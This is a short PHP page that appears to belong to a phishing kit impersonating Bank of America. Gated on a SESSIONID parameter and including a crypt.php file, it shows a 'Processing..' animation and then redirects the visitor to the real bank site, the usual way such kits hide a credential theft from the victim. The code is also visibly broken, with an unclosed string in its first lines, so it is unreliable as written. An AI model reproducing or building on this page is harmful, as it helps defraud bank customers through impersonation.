<?php
if (isset($_GET['SESSIONID'])) {
$session="confirmed.php;
?>
<!DOCTYPE html>
<html>
<?php require_once 'crypt.php'; ?>
<head>
<title>Processing..</title>
<meta http-equiv="content-type" content="text/html;charset=utf-8" />

<link rel="shortcut icon" href="images/favicon.ico" type="image/ico" />
<META HTTP-EQUIV="Refresh" CONTENT="5;URL=https://www.bankofamerica.com/<?php echo $session; ?>">
   

<style>
img{
	position:absolute;
	left:50%;
	top:50%;
	margin:-75px 0 0 -135px;
}
</style>
<link rel="stylesheet" type="text/css" href="images/style.css?css_session=<?php echo $session; ?>" media="all" />
</head>

<body>
	<div id="preprocessing"> </div>
	<img src = "images/animation_processing.gif" alt="Processing..">

</body>

</html> 
<?php ob_end_flush(); }?>